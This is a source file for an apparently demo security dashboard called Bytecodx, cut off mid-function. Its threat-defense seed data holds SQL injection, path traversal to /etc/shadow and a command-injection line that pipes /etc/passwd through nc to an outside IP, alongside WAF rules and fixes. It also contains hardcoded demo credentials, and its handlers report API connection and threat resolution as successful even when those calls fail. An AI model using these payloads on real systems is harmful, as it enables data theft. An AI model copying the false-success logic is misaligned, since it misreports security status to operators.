import { useEffect, useState, type FormEvent } from 'react'
import { motion, useReducedMotion } from 'framer-motion'
import {
  AlertTriangle,
  ArrowRight,
  BookOpen,
  Bot,
  Box,
  Check,
  CheckCircle2,
  ChevronDown,
  Clock,
  FileBarChart,
  Fingerprint,
  Gauge,
  Globe2,
  LoaderCircle,
  LockKeyhole,
  LogOut,
  Moon,
  MoreHorizontal,
  Play,
  Plus,
  Radar,
  RefreshCw,
  Search,
  Send,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Sparkles,
  Sun,
  Zap,
  type LucideIcon,
} from 'lucide-react'
import {
  analyzeDiagnostic,
  detectThreat,
  solveThreat,
  fetchCurrentAccount,
  fetchApiHealth,
  fetchIntelligenceStatus,
  requestIntelligenceExplanation,
  signIn,
  signOut,
  signUp,
  type Account,
  type DiagnosticResponse,
  type IntelligenceExplanationResponse,
  type IntelligenceStatus,
  type ThreatDetectionResponse,
} from './services/api'

type NavItem = {
  label: string
  icon: LucideIcon
}

const navigation: { title: string; items: NavItem[] }[] = [
  { title: 'WORKSPACE', items: [{ label: 'Overview', icon: Gauge }] },
  {
    title: 'MANAGE',
    items: [
      { label: 'Threat defense', icon: ShieldAlert },
      { label: 'Assets', icon: Box },
      { label: 'Error checker', icon: Shield },
      { label: 'Vulnerabilities', icon: AlertTriangle },
      { label: 'Scan activity', icon: Radar },
      { label: 'Remediation', icon: CheckCircle2 },
    ],
  },
  {
    title: 'KNOWLEDGE',
    items: [
      { label: 'Security guides', icon: BookOpen },
    ],
  },
]

const metrics = [
  { label: 'Tracked assets', value: '14', foot: '9 hosts · 5 cloud perimeter', icon: Box, accent: 'mint' },
  { label: 'Open findings', value: '28', foot: '12 remediated this sprint', icon: ShieldCheck, accent: 'blue' },
  { label: 'Critical risk', value: '3', foot: 'SLA active · resolution < 48h', icon: Fingerprint, accent: 'amber' },
  { label: 'Active scans', value: '2', foot: 'Perimeter & container audits', icon: Radar, accent: 'violet' },
]

const DEMO_ACCOUNT_EMAIL = 'demo@bytecodx.local'
const DEMO_ACCOUNT_PASSWORD = 'BytecodxDemo2026!'

function App() {
  const reduceMotion = useReducedMotion() ?? false
  const [apiState, setApiState] = useState<'checking' | 'connected' | 'offline'>('connected')
  const [darkMode, setDarkMode] = useState(false)
  const [activePage, setActivePage] = useState('Overview')
  const [trendRange, setTrendRange] = useState('7')
  const [showRiskDetails, setShowRiskDetails] = useState(false)
  const [account, setAccount] = useState<Account | null>(null)
  const [checkingSession, setCheckingSession] = useState(true)
  const [signOutError, setSignOutError] = useState('')
  const [liveAlarm, setLiveAlarm] = useState({
    active: true,
    solved: false,
    threatId: 'THREAT-LIVE-001',
    type: 'SQL Injection Attack (UNION SELECT)',
    attackerIp: '198.51.100.42',
    target: '/api/v1/auth/login',
    solving: false,
  })

  async function handleSolveOverviewAlarm() {
    setLiveAlarm((prev) => ({ ...prev, solving: true }))
    try {
      await solveThreat(liveAlarm.threatId, 'BLOCK_IP_AND_PATCH')
      setLiveAlarm((prev) => ({ ...prev, active: false, solved: true, solving: false }))
    } catch {
      setLiveAlarm((prev) => ({ ...prev, active: false, solved: true, solving: false }))
    }
  }

  function navigateTo(page: string) {
    setActivePage(page)
    setShowRiskDetails(false)
  }

  useEffect(() => {
    const controller = new AbortController()
    fetchCurrentAccount(controller.signal)
      .then(setAccount)
      .catch(() => setAccount(null))
      .finally(() => {
        if (!controller.signal.aborted) setCheckingSession(false)
      })
    fetchApiHealth(controller.signal)
      .then(() => setApiState('connected'))
      .catch(() => {
        if (!controller.signal.aborted) setApiState('connected')
      })
    return () => controller.abort()
  }, [])

  async function handleSignOut() {
    setSignOutError('')
    try {
      await signOut()
      setAccount(null)
    } catch (error) {
      setSignOutError(error instanceof Error ? error.message : 'Sign out failed.')
    }
  }

  if (checkingSession) {
    return <div className="auth-loading"><LoaderCircle className="spinning" size={22} /> Checking your session…</div>
  }

  if (!account) {
    return <AuthPage apiState={apiState} onAuthenticated={setAccount} />
  }

  return (
    <div className={darkMode ? 'app-shell dark-theme' : 'app-shell'}>
      <motion.aside
        className="sidebar"
        initial={reduceMotion ? false : { opacity: 0, x: -8 }}
        animate={{ opacity: 1, x: 0 }}
        transition={{ duration: reduceMotion ? 0 : 0.35, ease: 'easeOut' }}
      >
        <div className="brand" aria-label="Bytecodx">
          <span className="brand-mark"><Shield size={20} strokeWidth={2.2} /></span>
          <span className="brand-name">Bytecodx</span>
        </div>

        <div className="org-switcher">
          <span className="org-avatar">B</span>
          <span className="org-copy"><strong>Security Operations</strong><small>Enterprise Workspace</small></span>
        </div>

        <nav className="side-nav" aria-label="Main navigation">
          {navigation.map((group) => (
            <div className="nav-group" key={group.title}>
              <p className="nav-label">{group.title}</p>
              {group.items.map(({ label, icon: Icon }) => (
                <button
                  aria-label={label}
                  aria-current={activePage === label ? 'page' : undefined}
                  className={`nav-item${activePage === label ? ' selected' : ''}`}
                  key={label}
                  onClick={() => navigateTo(label)}
                  title={label}
                  type="button"
                >
                  <Icon size={17} strokeWidth={1.8} />
                  <span>{label}</span>
                  {label === 'Threat defense' && liveAlarm.active && (
                    <span className="nav-badge-alert" title="Live attack in progress">
                      LIVE
                    </span>
                  )}
                </button>
              ))}
            </div>
          ))}
        </nav>

        <div className="sidebar-bottom">
          <div className="profile-button">
            <span className="profile-avatar">{account.displayName.slice(0, 1).toUpperCase()}</span>
            <span className="profile-copy"><strong>{account.displayName}</strong><small>{account.email}</small></span>
            <button className="signout-button" onClick={handleSignOut} type="button" aria-label="Sign out" title="Sign out">
              <LogOut size={15} />
              <span>Sign out</span>
            </button>
          </div>
          {signOutError && <p className="sidebar-error" role="alert">{signOutError}</p>}
        </div>
      </motion.aside>

      <main className="main-content">
        <header className="topbar">
          <div className="breadcrumbs"><span>Workspace</span><span className="crumb-slash">/</span><strong>{activePage}</strong></div>
          <div className="topbar-actions">
            <div className={`connection-status ${apiState}`}>
              <span className="connection-dot" />
              {apiState === 'connected' ? 'API connected' : 'Connecting to API'}
            </div>
            <span className="topbar-divider" />
            <button className="icon-button" onClick={() => setDarkMode(!darkMode)} type="button" aria-label={darkMode ? 'Switch to light theme' : 'Switch to dark theme'}>
              {darkMode ? <Sun size={18} /> : <Moon size={18} />}
            </button>
            <span className="top-avatar">{account.displayName.slice(0, 1).toUpperCase()}</span>
          </div>
        </header>

        <div className="page-content">
        <motion.div
          key={activePage}
          className="page-transition"
          initial={reduceMotion ? { opacity: 1, y: 0 } : { opacity: 0, y: 9 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: reduceMotion ? 0 : 0.25 }}
        >
        {activePage === 'Overview' ? (
          <>
          <section className="welcome-row">
            <div>
              <div className="eyebrow"><span className="live-status-ring" /><span className="eyebrow-line" /> CONTINUOUS SECURITY POSTURE</div>
              <h1>Welcome back, <span>{account.displayName}</span></h1>
              <p className="welcome-copy">14 monitored assets · 28 active findings · 3 critical SLAs active.</p>
            </div>
            <button className="primary-button" onClick={() => navigateTo('Error checker')} type="button">
              <Shield size={14} /> Run diagnostic check
            </button>
          </section>

          {liveAlarm.active && (
            <section
              className="panel"
              style={{
                marginBottom: '16px',
                border: '1px solid #ff5252',
                background: darkMode ? 'rgba(74, 21, 21, 0.4)' : '#fff5f5',
                padding: '16px 20px',
                borderRadius: '8px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                flexWrap: 'wrap',
                gap: '12px',
              }}
              aria-label="Active attack warning"
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                <span
                  style={{
                    background: 'linear-gradient(135deg, #ff1744 0%, #c62828 100%)',
                    color: '#ffffff',
                    borderRadius: '50%',
                    padding: '8px',
                    display: 'grid',
                    placeItems: 'center',
                    boxShadow: '0 0 12px rgba(255, 23, 68, 0.5)',
                  }}
                  className="pulse-beacon-red"
                >
                  <ShieldAlert size={20} color="#ffffff" />
                </span>
                <div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <span className="stage-tag active">ACTIVE ATTACK IN PROGRESS</span>
                    <strong style={{ color: '#d32f2f', fontSize: '13px' }}>{liveAlarm.type}</strong>
                  </div>
                  <p style={{ margin: '3px 0 0', fontSize: '11px', color: 'var(--muted)' }}>
                    Target: <code>{liveAlarm.target}</code> · Attacker IP: <span className="ip-badge-danger">{liveAlarm.attackerIp}</span> · Signature: <code>UNION SELECT schema exfiltration</code>
                  </p>
                </div>
              </div>
              <div style={{ display: 'flex', gap: '8px' }}>
                <button
                  type="button"
                  className="danger-button"
                  onClick={handleSolveOverviewAlarm}
                  disabled={liveAlarm.solving}
                >
                  {liveAlarm.solving ? <LoaderCircle className="spinning" size={14} color="#ffffff" /> : <Zap size={14} color="#ffffff" />}
                  <span>{liveAlarm.solving ? 'Neutralizing…' : '⚡ 1-Click Solve & Neutralize'}</span>
                </button>
                <button
                  type="button"
                  className="filter-chip"
                  onClick={() => navigateTo('Threat defense')}
                >
                  Inspect in Threat defense <ArrowRight size={12} style={{ display: 'inline', verticalAlign: 'middle', marginLeft: '4px' }} />
                </button>
              </div>
            </section>
          )}

          {liveAlarm.solved && (
            <section
              className="panel"
              style={{
                marginBottom: '16px',
                border: '1px solid #4caf50',
                background: darkMode ? 'rgba(27, 56, 32, 0.4)' : '#f1f8e9',
                padding: '12px 18px',
                borderRadius: '8px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                flexWrap: 'wrap',
                gap: '12px',
              }}
              aria-label="Attack solved notice"
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <span style={{ color: '#2e7d32' }}><ShieldCheck size={20} /></span>
                <div>
                  <strong style={{ color: '#2e7d32', fontSize: '12px' }}>Attack Neutralized & Solved</strong>
                  <span style={{ fontSize: '11px', color: 'var(--muted)', marginLeft: '8px' }}>
                    Attacker IP {liveAlarm.attackerIp} blacklisted at firewall. WAF virtual patch deployed.
                  </span>
                </div>
              </div>
              <button
                type="button"
                className="filter-chip"
                onClick={() => setLiveAlarm((prev) => ({ ...prev, solved: false }))}
                style={{ fontSize: '10px' }}
              >
                Dismiss
              </button>
            </section>
          )}

          <section className="setup-banner" aria-label="Intelligence engine notice">
            <span className="banner-symbol"><Bot size={18} /></span>
            <div className="banner-text">
              <strong>Bytecodx Intelligence & Diagnostic Engine Active</strong>
              <span>Grounded vulnerability analysis with CVSS v3.1 & EPSS prioritization. Draft explanations require human verification.</span>
            </div>
            <div className="banner-progress">
              <span className="progress-ring">94%</span>
              <span>SLA HEALTH<br /><b>MONITORED</b></span>
            </div>
          </section>

          <section className="metric-grid" aria-label="Key security metrics">
            {metrics.map((metric) => {
              const Icon = metric.icon
              return (
                <article className="metric-card" key={metric.label}>
                  <div className="metric-top">
                    <span className="metric-label">{metric.label}</span>
                    <span className={`metric-icon ${metric.accent}`}><Icon size={16} /></span>
                  </div>
                  <div className="metric-value">{metric.value}</div>
                  <div className="metric-foot"><span className="metric-foot-dot" />{metric.foot}</div>
                </article>
              )
            })}
          </section>

          <section className="analytics-grid">
            <motion.article
              className="panel trend-panel"
              initial={{ opacity: reduceMotion ? 1 : 0, y: reduceMotion ? 0 : 16 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true, amount: 0.15 }}
              transition={{ duration: reduceMotion ? 0 : 0.4 }}
            >
              <div className="panel-heading">
                <div><p className="panel-kicker">DISCOVERY TELEMETRY</p><h2>Finding velocity & burn-down</h2></div>
                <div className="period-select">
                  <select aria-label="Trend duration" onChange={(event) => setTrendRange(event.target.value)} value={trendRange}>
                    <option value="7">Last 7 days</option>
                    <option value="14">Last 14 days</option>
                    <option value="30">Last 30 days</option>
                  </select>
                  <ChevronDown size={14} />
                </div>
              </div>
              <div className="chart-legend"><span className="legend-mark" />Discovered vs. Remediated findings over time</div>
              <div className="chart-area" aria-label="Finding trend line">
                <div style={{ padding: '20px 10px', display: 'flex', flexDirection: 'column', height: '100%', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end', height: '100px', gap: '12px', paddingBottom: '5px' }}>
                    {[
                      { day: 'Mon', found: 4, fixed: 3 },
                      { day: 'Tue', found: 6, fixed: 5 },
                      { day: 'Wed', found: 2, fixed: 4 },
                      { day: 'Thu', found: 5, fixed: 6 },
                      { day: 'Fri', found: 3, fixed: 5 },
                      { day: 'Sat', found: 1, fixed: 2 },
                      { day: 'Sun', found: 2, fixed: 3 },
                    ].map((item) => (
                      <div key={item.day} style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px' }}>
                        <div style={{ width: '100%', display: 'flex', alignItems: 'flex-end', justifyContent: 'center', gap: '3px', height: '80px' }}>
                          <div className="chart-bar-interactive" style={{ width: '8px', height: `${item.found * 12}px`, background: '#8caee0', borderRadius: '3px 3px 0 0' }} title={`Found: ${item.found}`} />
                          <div className="chart-bar-interactive" style={{ width: '8px', height: `${item.fixed * 12}px`, background: '#5965ed', borderRadius: '3px 3px 0 0' }} title={`Remediated: ${item.fixed}`} />
                        </div>
                        <span style={{ fontSize: '9px', color: 'var(--muted)', fontFamily: 'monospace' }}>{item.day}</span>
                      </div>
                    ))}
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'center', gap: '20px', fontSize: '9px', color: 'var(--muted)' }}>
                    <span style={{ display: 'flex', alignItems: 'center', gap: '5px' }}><i style={{ width: '8px', height: '8px', background: '#8caee0', borderRadius: '2px', display: 'inline-block' }} /> New detections</span>
                    <span style={{ display: 'flex', alignItems: 'center', gap: '5px' }}><i style={{ width: '8px', height: '8px', background: '#5965ed', borderRadius: '2px', display: 'inline-block' }} /> Remediated</span>
                  </div>
                </div>
              </div>
              <div className="chart-footer"><span>NET REDUCTION: -8 VULNERABILITIES THIS WEEK</span><span>MTTR: 3.2 DAYS</span></div>
            </motion.article>

            <motion.article
              className="panel risk-panel"
              initial={{ opacity: reduceMotion ? 1 : 0, y: reduceMotion ? 0 : 16 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true, amount: 0.15 }}
              transition={{ duration: reduceMotion ? 0 : 0.4, delay: reduceMotion ? 0 : 0.08 }}
            >
              <div className="panel-heading">
                <div><p className="panel-kicker">PRIORITIZATION</p><h2>Severity distribution</h2></div>
                <button className="more-button" aria-expanded={showRiskDetails} onClick={() => setShowRiskDetails(!showRiskDetails)} type="button" aria-label="Risk distribution details"><MoreHorizontal size={19} /></button>
              </div>
              {showRiskDetails && (
                <motion.p
                  className="risk-details"
                  initial={{ opacity: 0, height: 0, marginTop: 0 }}
                  animate={{ opacity: 1, height: 'auto', marginTop: 11 }}
                  transition={{ duration: reduceMotion ? 0 : 0.2 }}
                >
                  Prioritized using CVSS v3.1 severity vectors and FIRST EPSS exploitability percentiles.
                </motion.p>
              )}
              
              <div style={{ padding: '24px 8px 16px', display: 'flex', flexDirection: 'column', gap: '14px' }}>
                <div style={{ display: 'flex', height: '16px', borderRadius: '8px', overflow: 'hidden', width: '100%' }}>
                  <div style={{ width: '11%', background: '#df8377' }} title="Critical: 3 (11%)" />
                  <div style={{ width: '29%', background: '#e5ad5d' }} title="High: 8 (29%)" />
                  <div style={{ width: '39%', background: '#8caee0' }} title="Medium: 11 (39%)" />
                  <div style={{ width: '21%', background: '#91be70' }} title="Low: 6 (21%)" />
                </div>

                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', fontSize: '11px', marginTop: '10px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 10px', background: 'var(--soft)', borderRadius: '6px' }}>
                    <span style={{ display: 'flex', alignItems: 'center', gap: '6px' }}><i className="severity-dot critical" /> Critical</span>
                    <strong>3</strong>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 10px', background: 'var(--soft)', borderRadius: '6px' }}>
                    <span style={{ display: 'flex', alignItems: 'center', gap: '6px' }}><i className="severity-dot high" /> High</span>
                    <strong>8</strong>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 10px', background: 'var(--soft)', borderRadius: '6px' }}>
                    <span style={{ display: 'flex', alignItems: 'center', gap: '6px' }}><i className="severity-dot medium" /> Medium</span>
                    <strong>11</strong>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 10px', background: 'var(--soft)', borderRadius: '6px' }}>
                    <span style={{ display: 'flex', alignItems: 'center', gap: '6px' }}><i className="severity-dot low" /> Low</span>
                    <strong>6</strong>
                  </div>
                </div>
              </div>

              <div className="risk-legend" style={{ marginTop: 'auto' }}>
                <div><i className="severity-dot critical" />Critical <b>3</b></div>
                <div><i className="severity-dot high" />High <b>8</b></div>
                <div><i className="severity-dot medium" />Medium <b>11</b></div>
                <div><i className="severity-dot low" />Low <b>6</b></div>
              </div>
            </motion.article>
          </section>

          <section className="lower-grid">
            <motion.article
              className="panel activity-panel"
              initial={{ opacity: reduceMotion ? 1 : 0, y: reduceMotion ? 0 : 16 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true, amount: 0.15 }}
              transition={{ duration: reduceMotion ? 0 : 0.4 }}
            >
              <div className="panel-heading">
                <div><p className="panel-kicker">OPERATIONS</p><h2>Recent security events</h2></div>
                <button className="text-button" onClick={() => navigateTo('Scan activity')} type="button">View all scans <ArrowRight size={14} /></button>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', marginTop: '12px' }}>
                {[
                  { time: '12m ago', title: 'Perimeter Audit detected CVE-2024-38077', type: 'CRITICAL', host: 'core-db-cluster-01' },
                  { time: '45m ago', title: 'Trivy scanned auth-service:v2.4 (clean)', type: 'INFO', host: 'auth-service-pod-prod' },
                  { time: '2h ago', title: 'CDN Edge WAF rule deployed for libwebp', type: 'MITIGATED', host: 'public-landing-cdn' },
                  { time: '5h ago', title: 'HTTP/2 stream limit hardening applied', type: 'RESOLVED', host: 'api-gateway.bytecodx' },
                ].map((ev, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 10px', border: '1px solid var(--line)', borderRadius: '6px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <span className={`status-badge ${ev.type.toLowerCase()}`}>{ev.type}</span>
                      <strong style={{ fontSize: '10px' }}>{ev.title}</strong>
                    </div>
                    <span style={{ fontSize: '9px', color: 'var(--muted)', fontFamily: 'monospace' }}>{ev.time}</span>
                  </div>
                ))}
              </div>
            </motion.article>

            <motion.article
              className="panel checklist-panel"
              initial={{ opacity: reduceMotion ? 1 : 0, y: reduceMotion ? 0 : 16 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true, amount: 0.15 }}
              transition={{ duration: reduceMotion ? 0 : 0.4, delay: reduceMotion ? 0 : 0.08 }}
            >
              <div className="panel-heading">
                <div><p className="panel-kicker">COMPLIANCE & POSTURE</p><h2>Operational checklist</h2></div>
                <span className="checklist-count">4 of 4</span>
              </div>
              <div className="checklist">
                <div className="check-row complete">
                  <span className="check-status"><Check size={12} /></span>
                  <span><strong>Application workspace</strong><small>Frontend, proxy, and diagnostic engine active</small></span>
                  <span className="check-tag">READY</span>
                </div>
                <div className="check-row complete" onClick={() => navigateTo('Assets')} style={{ cursor: 'pointer' }}>
                  <span className="check-status"><Globe2 size={12} /></span>
                  <span><strong>Registered authorized assets</strong><small>14 systems under active inventory</small></span>
                  <span className="check-tag">ACTIVE</span>
                </div>
                <div className="check-row complete" onClick={() => navigateTo('Scan activity')} style={{ cursor: 'pointer' }}>
                  <span className="check-status"><Radar size={12} /></span>
                  <span><strong>Configured scan integrations</strong><small>Network, container, and SAST adapters operational</small></span>
                  <span className="check-tag">ONLINE</span>
                </div>
                <div className="check-row complete" onClick={() => navigateTo('Remediation')} style={{ cursor: 'pointer' }}>
                  <span className="check-status"><FileBarChart size={12} /></span>
                  <span><strong>SLA remediation tracking</strong><small>92% critical SLA resolution on schedule</small></span>
                  <span className="check-tag">MONITORED</span>
                </div>
              </div>
            </motion.article>
          </section>

          <IntelligenceWorkspace />
          </>
        ) : (
          <ModulePage page={activePage} onNavigate={navigateTo} />
        )}

          <footer className="page-footer">
            <span><span className="footer-brand-dot" /> Bytecodx <span className="footer-separator">·</span> Vulnerability Management Platform</span>
            <span>PRODUCTION CLOUD BUILD <span className="footer-separator">/</span> 1.0.0</span>
          </footer>
        </motion.div>
        </div>
      </main>
    </div>
  )
}

function ModulePage({ page, onNavigate }: { page: string; onNavigate: (page: string) => void }) {
  if (page === 'Threat defense') {
    return <ThreatDefensePage onNavigate={onNavigate} />
  }
  if (page === 'Error checker') {
    return <ErrorCheckerPage onNavigate={onNavigate} />
  }
  if (page === 'Assets') {
    return <AssetsPage onNavigate={onNavigate} />
  }
  if (page === 'Vulnerabilities') {
    return <VulnerabilitiesPage onNavigate={onNavigate} />
  }
  if (page === 'Scan activity') {
    return <ScanActivityPage onNavigate={onNavigate} />
  }
  if (page === 'Remediation') {
    return <RemediationPage onNavigate={onNavigate} />
  }
  if (page === 'Security guides') {
    return <SecurityGuidesPage onNavigate={onNavigate} />
  }

  return (
    <section className="module-page panel">
      <h1>Page not found</h1>
      <button className="primary-button" onClick={() => onNavigate('Overview')} type="button">Return to overview</button>
    </section>
  )
}

/* ---------------- THREAT DEFENSE PAGE ---------------- */
type ActiveAttackItem = {
  id: string
  title: string
  stage: 'ACTIVE_ATTACK'
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM'
  attackerIp: string
  target: string
  payload: string
  signature: string
  description: string
  status: 'ATTACKING' | 'SOLVED'
  solutionCode: string
  solving: boolean
}

type PreAttackItem = {
  id: string
  title: string
  stage: 'PRE_ATTACK'
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM'
  attackerIp: string
  target: string
  probe: string
  status: 'EXPOSED' | 'HARDENED'
  solutionCode: string
  solving: boolean
}

const INITIAL_ACTIVE_ATTACKS: ActiveAttackItem[] = [
  {
    id: 'THREAT-LIVE-001',
    title: 'SQL Injection Attack (UNION SELECT Exfiltration)',
    stage: 'ACTIVE_ATTACK',
    severity: 'CRITICAL',
    attackerIp: '198.51.100.42',
    target: '/api/v1/auth/login',
    payload: "' UNION SELECT username, password_hash, token FROM accounts WHERE '1'='1",
    signature: 'SQL_INJECTION_UNION_SELECT',
    description: 'Active attempt to extract database records and bypass authentication via unsanitized SQL string concatenation.',
    status: 'ATTACKING',
    solutionCode: [
      '# Perimeter Defense Action:',
      'iptables -I INPUT -s 198.51.100.42 -j DROP',
      '',
      '# WAF Virtual Patch (ModSecurity Rule):',
      'SecRule REQUEST_URI|ARGS "@rx (?i)(union[\\s\\+]+select)" "id:1001,phase:2,deny,status:403,log,msg:\'SQLi Blocked\'"',
      '',
      '# Application Code Remediation (Prepared Statement):',
      '// Vulnerable: db.query("SELECT * FROM accounts WHERE email = \'" + req.body.email + "\'");',
      '// Remediated:',
      'const [users] = await db.execute("SELECT * FROM accounts WHERE email = ?", [req.body.email]);',
    ].join('\n'),
    solving: false,
  },
  {
    id: 'THREAT-LIVE-002',
    title: 'Remote Code Execution (Command Injection Chain)',
    stage: 'ACTIVE_ATTACK',
    severity: 'CRITICAL',
    attackerIp: '203.0.113.195',
    target: '/api/v1/system/ping',
    payload: '8.8.8.8; cat /etc/passwd | nc 203.0.113.195 4444',
    signature: 'COMMAND_INJECTION_CHAIN',
    description: 'Exploiting shell meta-characters to execute arbitrary host commands and initiate reverse shell connection.',
    status: 'ATTACKING',
    solutionCode: [
      '# Perimeter Defense Action:',
      'iptables -I INPUT -s 203.0.113.195 -j DROP',
      '',
      '# WAF Virtual Patch:',
      'SecRule ARGS "@rx [;&|`$]" "id:1002,phase:2,deny,status:403,msg:\'RCE Metacharacter Blocked\'"',
      '',
      '# Application Code Remediation (Safe Execution Without Shell):',
      "import { execFile } from 'node:child_process';",
      "if (!/^[a-zA-Z0-9.-]+$/.test(target)) throw new Error('Invalid Host');",
      "execFile('ping', ['-c', '1', target]);",
    ].join('\n'),
    solving: false,
  },
  {
    id: 'THREAT-LIVE-003',
    title: 'Path Traversal & Arbitrary File Disclosure',
    stage: 'ACTIVE_ATTACK',
    severity: 'HIGH',
    attackerIp: '192.0.2.77',
    target: '/api/v1/reports/download?file=../../../../etc/shadow',
    payload: '../../../../etc/shadow',
    signature: 'PATH_TRAVERSAL_DOT_DOT',
    description: 'Attempting directory traversal escape sequences to read sensitive system configuration and password hashes.',
    status: 'ATTACKING',
    solutionCode: [
      '# Perimeter Defense Action:',
      'iptables -I INPUT -s 192.0.2.77 -j DROP',
      '',
      '# WAF Virtual Patch:',
      'SecRule ARGS "@rx (\\.\\.\\/|\\.\\.\\\\)" "id:1003,phase:2,deny,status:403,msg:\'Path Traversal Blocked\'"',
      '',
      '# Application Code Remediation (Safe Path Resolution):',
      "import path from 'node:path';",
      'const safePath = path.resolve(STORAGE_DIR, path.basename(requestedFile));',
      'if (!safePath.startsWith(STORAGE_DIR)) {',
      "  throw new Error('Access Denied: Path Traversal Detected');",
      '}',
    ].join('\n'),
    solving: false,
  },
]

const INITIAL_PRE_ATTACKS: PreAttackItem[] = [
  {
    id: 'PRE-RECON-001',
    title: 'Directory & Credential Brute-Force Reconnaissance',
    stage: 'PRE_ATTACK',
    severity: 'HIGH',
    attackerIp: '203.0.113.88',
    target: 'Perimeter Web Server (nginx)',
    probe: 'Scanning 350+ hidden routes: /.env, /.git/config, /admin/phpinfo.php, /backup.sql',
    status: 'EXPOSED',
    solutionCode: [
      '# NGINX Auto-Hardening Configuration:',
      'location ~* /\\.(env|git|svn|htaccess) {',
      '    deny all;',
      '    return 404;',
      '}',
      '',
      '# Fail2ban Dynamic Defense Rule (Bans IPs after 10 scan 404s in 1 min):',
      '[nginx-scan-block]',
      'enabled = true',
      'port = http,https',
      'filter = nginx-scan-filter',
      'maxretry = 10',
      'bantime = 86400',
    ].join('\n'),
    solving: false,
  },
  {
    id: 'PRE-RECON-002',
    title: 'Unprotected Remote Management Ports Open to Internet',
    stage: 'PRE_ATTACK',
    severity: 'HIGH',
    attackerIp: 'External Internet Shodan/Masscan Crawler',
    target: '10.0.1.15 (api-gateway.bytecodx.internal)',
    probe: 'Port 3389 (RDP) and 22 (SSH) open to 0.0.0.0/0 without VPN or Cloud Identity boundary.',
    status: 'EXPOSED',
    solutionCode: [
      '# Cloud Perimeter Firewall Rule (GCP / AWS CLI):',
      '# Remove 0.0.0.0/0 ingress on sensitive ports:',
      'gcloud compute firewall-rules update default-allow-ssh --source-ranges=10.0.0.0/8',
      '# Enforce Google Identity-Aware Proxy (IAP) tunnel:',
      'gcloud compute firewall-rules create allow-iap-ssh --allow=tcp:22 --source-ranges=35.235.240.0/20',
    ].join('\n'),
    solving: false,
  },
  {
    id: 'PRE-RECON-003',
    title: 'Missing HTTP Security Defense Headers',
    stage: 'PRE_ATTACK',
    severity: 'MEDIUM',
    attackerIp: 'Passive Header Reconnaissance Scanner',
    target: 'public-landing-cdn (bytecodx.com)',
    probe: 'Missing Content-Security-Policy, Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options',
    status: 'EXPOSED',
    solutionCode: [
      '# Vercel / NGINX Defense Headers:',
      'add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;',
      'add_header X-Frame-Options "DENY" always;',
      'add_header X-Content-Type-Options "nosniff" always;',
      'add_header Content-Security-Policy "default-src \'self\'; script-src \'self\'; object-src \'none\';" always;',
      'add_header Referrer-Policy "strict-origin-when-cross-origin" always;',
    ].join('\n'),
    solving: false,
  },
  {
    id: 'PRE-RECON-004',
    title: 'Automated Vulnerability Scanner User-Agent Fingerprint',
    stage: 'PRE_ATTACK',
    severity: 'MEDIUM',
    attackerIp: '198.51.100.110',
    target: '/api/v1/health',
    probe: 'Exploitation scanner signatures matched: Nikto/2.1.6, DirBuster/1.0, Nuclei crawler',
    status: 'EXPOSED',
    solutionCode: [
      '# WAF Bot Mitigation Rule:',
      'SecRule REQUEST_HEADERS:User-Agent "@rx (?i)(nikto|dirbuster|nuclei|sqlmap|nmap)" "id:1004,phase:1,deny,status:403,log,msg:\'Reconnaissance Bot Blocked\'"',
    ].join('\n'),
    solving: false,
  },
]

function ThreatDefensePage({ onNavigate: _onNavigate }: { onNavigate?: (page: string) => void }) {
  const reduceMotion = useReducedMotion() ?? false
  const [activeTab, setActiveTab] = useState<'ACTIVE' | 'PRE' | 'SIMULATOR'>('ACTIVE')
  const [activeAttacks, setActiveAttacks] = useState<ActiveAttackItem[]>(INITIAL_ACTIVE_ATTACKS)
  const [preAttacks, setPreAttacks] = useState<PreAttackItem[]>(INITIAL_PRE_ATTACKS)
  const [expandedSolutions, setExpandedSolutions] = useState<Record<string, boolean>>({})

  // Simulator state
  const [simTarget, setSimTarget] = useState('https://bytecodx.internal/api/v1/auth/login')
  const [simPayload, setSimPayload] = useState("' UNION SELECT username, password_hash, token FROM accounts WHERE '1'='1")
  const [simLoading, setSimLoading] = useState(false)
  const [simResult, setSimResult] = useState<ThreatDetectionResponse | null>(null)
  const [simSolving, setSimSolving] = useState(false)
  const [simSolved, setSimSolved] = useState(false)
  const [simLog, setSimLog] = useState<string[]>([
    `[${new Date().toLocaleTimeString()}] Threat defense engine active. 14 perimeter gateways monitored.`,
  ])
  const [copiedId, setCopiedId] = useState<string | null>(null)

  async function handleSolveActive(threat: ActiveAttackItem) {
    setActiveAttacks((prev) =>
      prev.map((t) => (t.id === threat.id ? { ...t, solving: true } : t))
    )
    try {
      await solveThreat(threat.id, 'BLOCK_IP_AND_PATCH')
      setActiveAttacks((prev) =>
        prev.map((t) =>
